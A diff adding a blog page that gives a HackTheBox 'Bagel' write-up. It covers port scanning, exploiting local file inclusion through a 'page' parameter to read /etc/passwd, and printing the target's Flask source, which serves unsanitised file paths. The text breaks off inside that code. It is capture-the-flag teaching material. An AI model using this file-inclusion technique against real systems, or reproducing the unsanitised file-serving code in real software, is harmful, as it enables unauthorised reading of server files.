@@ -1,0 +1,1313 @@
+
+
+
+
+
+
+
+<!doctype html>
+<html
+  lang="en"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="dark"
+  data-auto-appearance="true"
+><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="theme-color" content="#FFFFFF" />
+  
+  <title>HackTheBox - Bagel &middot; Pwnverse</title>
+    <meta name="title" content="HackTheBox - Bagel &middot; Pwnverse" />
+  
+  
+  
+  
+  
+  <script
+    type="text/javascript"
+    src="/js/appearance.min.74ad8406faea02f3e186ba5126249aaeed9073629e04b05037b903396b188724.js"
+    integrity="sha256-dK2EBvrqAvPhhrpRJiSaru2Qc2KeBLBQN7kDOWsYhyQ="
+  ></script>
+  
+  
+  
+  
+  
+  
+  
+    
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="/css/main.bundle.min.08a8b4fd2fc33a310672cf904cb80180b606b9bed401bae22e905ac1a4fa351c.css"
+    integrity="sha256-CKi0/S/DOjEGcs&#43;QTLgBgLYGub7UAbriLpBawaT6NRw="
+  />
+  
+    
+    
+    
+  
+  
+  
+    
+    
+  
+  
+    
+    
+  
+  
+  
+    
+    <script
+      defer
+      type="text/javascript"
+      id="script-bundle"
+      src="/js/main.bundle.min.0ce71464304b0e7f6f5dc04656b9ff39cbcb7ff30af0a0e1268c1c3147e8ddd8.js"
+      integrity="sha256-DOcUZDBLDn9vXcBGVrn/OcvLf/MK8KDhJowcMUfo3dg="
+      data-copy="Copy"
+      data-copied="Copied"
+    ></script>
+  
+  
+  <meta
+    name="description"
+    content="
+      
+        WriteUp for HackTheBox Bagel machine.
+Starting off with the nmap scan, we can it has 3 ports open (it missed one more port which was open due to some issue):
+      
+    "
+  />
+  
+  
+  
+  <link rel="canonical" href="//localhost:1313/posts/bagel-htb/" />
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+    <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:url" content="//localhost:1313/posts/bagel-htb/">
+  <meta property="og:site_name" content="Pwnverse">
+  <meta property="og:title" content="HackTheBox - Bagel">
+  <meta property="og:description" content="WriteUp for HackTheBox Bagel machine.
+Starting off with the nmap scan, we can it has 3 ports open (it missed one more port which was open due to some issue):">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2023-06-03T00:00:00+00:00">
+    <meta property="article:modified_time" content="2023-06-03T00:00:00+00:00">
+    <meta property="article:tag" content="Python">
+    <meta property="article:tag" content="Sqlmap">
+    <meta property="article:tag" content="Web-App">
+    <meta property="article:tag" content="Dotnet">
+    <meta property="article:tag" content="DLL">
+    <meta property="article:tag" content="Deserialisation">
+
+  <meta name="twitter:card" content="summary"><meta name="twitter:title" content="HackTheBox - Bagel">
+<meta name="twitter:description" content="WriteUp for HackTheBox Bagel machine.
+Starting off with the nmap scan, we can it has 3 ports open (it missed one more port which was open due to some issue):">
+
+  
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Posts",
+    "name": "HackTheBox - Bagel",
+    "headline": "HackTheBox - Bagel",
+    
+    "abstract": "WriteUp for HackTheBox Bagel machine.\nStarting off with the nmap scan, we can it has 3 ports open (it missed one more port which was open due to some issue):",
+    "inLanguage": "en",
+    "url" : "\/\/localhost:1313\/posts\/bagel-htb\/",
+    "author" : {
+      "@type": "Person",
+      "name": "D4mianWayne"
+    },
+    "copyrightYear": "2023",
+    "dateCreated": "2023-06-03T00:00:00\u002b00:00",
+    "datePublished": "2023-06-03T00:00:00\u002b00:00",
+    
+    "dateModified": "2023-06-03T00:00:00\u002b00:00",
+    
+    "keywords": ["python","sqlmap","web-app","dotnet","DLL","deserialisation","NewtonSoft","websocket"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "1544"
+  }
+  </script>
+
+
+  
+  <meta name="author" content="D4mianWayne" />
+  
+  
+  
+
+
+
+
+
+
+  
+  
+
+  
+  
+</head>
+<body
+    class="m-auto flex h-screen max-w-7xl flex-col bg-neutral px-6 text-lg leading-7 text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32"
+  >
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="-translate-y-8 rounded-b-lg bg-primary-200 px-3 py-1 text-sm focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content"
+        ><span class="pe-2 font-bold text-primary-600 dark:text-primary-400">&darr;</span
+        >Skip to main content</a
+      >
+    </div>
+    
+    
+      <header class="py-6 font-semibold text-neutral-900 dark:text-neutral sm:py-10 print:hidden">
+  <nav class="flex items-start justify-between sm:items-center">
+    
+    <div class="z-40 flex flex-row items-center">
+      
+  <a
+    class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
+    rel="me"
+    href="/"
+    >Pwnverse</a
+  >
+
+    </div>
+    
+      
+      <label id="menu-button" for="menu-controller" class="block sm:hidden">
+        <input type="checkbox" id="menu-controller" class="hidden" />
+        <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
+          <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+</span>
+        </div>
+        <div
+          id="menu-wrapper"
+          class="invisible fixed inset-0 z-30 m-auto h-full w-full cursor-default overflow-auto bg-neutral-100/50 opacity-0 backdrop-blur-sm transition-opacity dark:bg-neutral-900/50"
+        >
+          <ul
+            class="mx-auto flex w-full max-w-7xl list-none flex-col overflow-visible px-6 py-6 text-end sm:px-14 sm:py-10 sm:pt-10 md:px-24 lg:px-32"
+          >
+            <li class="mb-1">
+              <span class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400"
+                ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+</span></span
+              >
+            </li>
+            
+              
+                
+                <li class="group mb-1">
+                  
+                    <a
+                      href="/posts/"
+                      title=""
+                      onclick="close_menu()"
+                      
+                      ><span
+                          class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                          >Blog</span
+                        >
+                      </a
+                    >
+                  
+                </li>
+              
+                
+                <li class="group mb-1">
+                  
+                    <a
+                      href="/categories/"
+                      title=""
+                      onclick="close_menu()"
+                      
+                      ><span
+                          class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                          >Categories</span
+                        >
+                      </a
+                    >
+                  
+                </li>
+              
+                
+                <li class="group mb-1">
+                  
+                    <a
+                      href="/about/"
+                      title=""
+                      onclick="close_menu()"
+                      
+                      ><span
+                          class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                          >About</span
+                        >
+                      </a
+                    >
+                  
+                </li>
+              
+                
+                <li class="group mb-1">
+                  
+                    <a
+                      href="/tags/"
+                      title=""
+                      onclick="close_menu()"
+                      
+                      ><span
+                          class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                          >Tags</span
+                        >
+                      </a
+                    >
+                  
+                </li>
+              
+                
+                <li class="group mb-1">
+                  
+                    <a
+                      href="https://github.com/D4mianWayne"
+                      title=""
+                      onclick="close_menu()"
+                      target="_blank"
+                      >
+                        <span
+                          class="group-dark:hover:text-primary-400 transition-colors group-hover:text-primary-600"
+                        ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+</span></span></a
+                    >
+                  
+                </li>
+              
+                
+                <li class="group mb-1">
+                  
+                    
+                    
+                      <button
+                        id="search-button-1"
+                        title="Search (/)"
+                      >
+                        
+                          <span
+                            class="group-dark:hover:text-primary-400 transition-colors group-hover:text-primary-600"
+                          ><span class="icon relative inline-block px-1 align-text-bottom"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span></span><span
+                            class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                            ></span
+                          >
+                        
+                      </button>
+                    
+                  
+                </li>
+              
+                
+                  
+              
+            
+          </ul>
+        </div>
+      </label>
+      
+      <ul class="hidden list-none flex-row text-end sm:flex">
+        
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
+              
+                <a
+                  href="/posts/"
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Blog</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
+              
+                <a
+                  href="/categories/"
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Categories</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
+              
+                <a
+                  href="/about/"
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >About</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
+              
+                <a
+                  href="/tags/"
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Tags</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
+              
+                <a
+                  href="https://github.com/D4mianWayne"
+                  title=""
+                  target="_blank"
+                  >
+                    <span
+                      class="group-dark:hover:text-primary-400 transition-colors group-hover:text-primary-600"
+                    ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+</span></span></a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
+              
+                
+                
+                  <button
+                    id="search-button-2"
+                    title="Search (/)"
+                  >
+                    
+                      <span
+                        class="group-dark:hover:text-primary-400 transition-colors group-hover:text-primary-600"
+                      ><span class="icon relative inline-block px-1 align-text-bottom"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span></span><span
+                        class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                        ></span
+                      >
+                    
+                  </button>
+                
+              
+            </li>
+          
+            
+              
+          
+
+        
+      </ul>
+    
+  </nav>
+</header>
+
+    
+    <div class="relative flex grow flex-col">
+      <main id="main-content" class="grow">
+        
+  <article class="max-w-screen-xl mx-auto"> 
+    <header class="max-w-prose">
+      
+        <ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden">
+  
+  
+    
+  
+    
+  
+  <li class="hidden inline">
+    <a
+      class="dark:underline-neutral-600 decoration-neutral-300 hover:underline"
+      href="/"
+      >Pwnverse</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class=" inline">
+    <a
+      class="dark:underline-neutral-600 decoration-neutral-300 hover:underline"
+      href="/posts/"
+      >Posts</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="hidden inline">
+    <a
+      class="dark:underline-neutral-600 decoration-neutral-300 hover:underline"
+      href="/posts/bagel-htb/"
+      >HackTheBox - Bagel</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+</ol>
+
+
+      
+      <h1 class="mb-8 mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        HackTheBox - Bagel
+      </h1>
+      
+        <div class="mb-10 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+          
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2023-06-03 00:00:00 &#43;0000 UTC">3 June 2023</time><span class="px-2 text-primary-500">&middot;</span><span>1544 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">8 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+  
+    <div class="my-1 flex flex-wrap text-xs leading-relaxed text-neutral-500 dark:text-neutral-400">
+      
+        
+          
+            <a
+              href="/categories/hackthebox/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >HackTheBox</a
+            >
+          
+        
+      
+        
+          
+            <a
+              href="/tags/python/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >Python</a
+            >
+          
+            <a
+              href="/tags/sqlmap/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >Sqlmap</a
+            >
+          
+            <a
+              href="/tags/web-app/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >Web-App</a
+            >
+          
+            <a
+              href="/tags/dotnet/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >Dotnet</a
+            >
+          
+            <a
+              href="/tags/dll/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >DLL</a
+            >
+          
+            <a
+              href="/tags/deserialisation/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >Deserialisation</a
+            >
+          
+            <a
+              href="/tags/newtonsoft/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >NewtonSoft</a
+            >
+          
+            <a
+              href="/tags/websocket/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >Websocket</a
+            >
+          
+        
+      
+    </div>
+  
+
+
+        </div>
+      
+      
+    </header>
+    <section class="prose mt-0 flex max-w-full flex-col dark:prose-invert lg:flex-row">
+      
+        <div class="order-first px-0 lg:order-last lg:max-w-xs lg:ps-8">
+          <div class="toc pe-5 lg:sticky lg:top-10 print:hidden">
+            <details open class="-ms-5 mt-0 overflow-hidden rounded-lg ps-5">
+  <summary
+    class="block cursor-pointer bg-neutral-100 py-1 ps-5 text-lg font-semibold text-neutral-800 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden"
+  >
+    Table of Contents
+  </summary>
+  <div class="border-s border-dotted border-neutral-300 py-2 ps-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#analysing-the-bageldll">Analysing the <code>bagel.dll</code></a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+          </div>
+        </div>
+          
+      <div class="min-h-0 min-w-0 max-w-full lg:max-w-prose grow"> 
+        <p>WriteUp for HackTheBox Bagel machine.</p>
+<!-- more -->
+<p>Starting off with the <code>nmap</code> scan, we can it has 3 ports open (it missed one more port which was open due to some issue):</p>
+<p>Checking the HTTP port, we see it is more of a static site, one thing that caught my eye was the <code>page</code> parameter in the URI:</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/Bagel_299b40e8bc344ae7904cea7a0b1ed5cf/Untitled.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>Capturing the request and checking in the burp suite for LFI resulted in success and we could see the <code>/etc/passwd</code> file contents ini the response:</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/Bagel_299b40e8bc344ae7904cea7a0b1ed5cf/Untitled_1.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>Checking for the current process, we see that it is running from the <code>developer</code> user’s directory and it is probably a <code>flask</code> application:</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/Bagel_299b40e8bc344ae7904cea7a0b1ed5cf/Untitled_2.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>We can retrieve the contents of the <code>[app.py](http://app.py)</code> :</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/Bagel_299b40e8bc344ae7904cea7a0b1ed5cf/Untitled_3.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>Checking the <code>[app.py](http://app.py)</code> code, we see that it has an endpoint <code>orders</code> which connects to the websocket running on the port <code>5000</code> and sends a JSON body as a part of the request, we also notice that there is a comment mentioning another file which is responsible for handling the websocket request and it is build with <code>dotnet</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="nx">from</span> <span class="nx">flask</span> <span class="kr">import</span> <span class="nx">Flask</span><span class="p">,</span> <span class="nx">request</span><span class="p">,</span> <span class="nx">send_file</span><span class="p">,</span> <span class="nx">redirect</span><span class="p">,</span> <span class="nx">Response</span>
+</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">os</span><span class="p">.</span><span class="nx">path</span>
+</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">websocket</span><span class="p">,</span><span class="nx">json</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">app</span> <span class="o">=</span> <span class="nx">Flask</span><span class="p">(</span><span class="nx">__name__</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">@</span><span class="nx">app</span><span class="p">.</span><span class="nx">route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nx">def</span> <span class="nx">index</span><span class="p">()</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s1">&#39;page&#39;</span> <span class="k">in</span> <span class="nx">request</span><span class="p">.</span><span class="nx">args</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">page</span> <span class="o">=</span> <span class="s1">&#39;static/&#39;</span><span class="o">+</span><span class="nx">request</span><span class="p">.</span><span class="nx">args</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;page&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="nx">os</span><span class="p">.</span><span class="nx">path</span><span class="p">.</span><span class="nx">isfile</span><span class="p">(</span><span class="nx">page</span><span class="p">)</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">resp</span><span class="o">=</span><span class="nx">send_file</span><span class="p">(</span><span class="nx">page</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">resp</span><span class="p">.</span><span class="nx">direct_passthrough</span> <span class="o">=</span> <span class="nx">False</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="nx">os</span><span class="p">.</span><span class="nx">path</span><span class="p">.</span><span class="nx">getsize</span><span class="p">(</span><span class="nx">page</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">                    <span class="nx">resp</span><span class="p">.</span><span class="nx">headers</span><span class="p">[</span><span class="s2">&#34;Content-Length&#34;</span><span class="p">]</span><span class="o">=</span><span class="nx">str</span><span class="p">(</span><span class="nx">len</span><span class="p">(</span><span class="nx">resp</span><span class="p">.</span><span class="nx">get_data</span><span class="p">()))</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="nx">resp</span>
+</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="s2">&#34;File not found&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="nx">redirect</span><span class="p">(</span><span class="s1">&#39;http://localhost:8000/?page=index.html&#39;</span><span class="p">,</span> <span class="nx">code</span><span class="o">=</span><span class="mi">302</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">@</span><span class="nx">app</span><span class="p">.</span><span class="nx">route</span><span class="p">(</span><span class="s1">&#39;/orders&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nx">def</span> <span class="nx">order</span><span class="p">()</span><span class="o">:</span> <span class="err">#</span> <span class="nx">don</span><span class="s1">&#39;t forget to run the order app first with &#34;dotnet &lt;path to .dll&gt;&#34; command. Use your ssh key to access the machine.
+</span></span></span><span class="line"><span class="cl"><span class="s1">    try:
+</span></span></span><span class="line"><span class="cl"><span class="s1">        ws = websocket.WebSocket()    
+</span></span></span><span class="line"><span class="cl"><span class="s1">        ws.connect(&#34;ws://127.0.0.1:5000/&#34;) # connect to order app
+</span></span></span><span class="line"><span class="cl"><span class="s1">        order = {&#34;ReadOrder&#34;:&#34;orders.txt&#34;}
+</span></span></span><span class="line"><span class="cl"><span class="s1">        data = str(json.dumps(order))
+</span></span></span><span class="line"><span class="cl"><span class="s1">        ws.send(data)
+</span></span></span><span class="line"><span class="cl"><span class="s1">        result = ws.recv()
+</span></span></span><span class="line"><span class="cl"><span class="s1">        return(json.loads(result)[&#39;</span><span class="nx">ReadOrder</span><span class="s1">&#39;])
+</span></span></span><span class="line"><span class="cl"><span class="s1">    except:
+</span></span></span><span class="line"><span class="cl"><span class="s1">        return(&#34;Unable to connect&#34;)
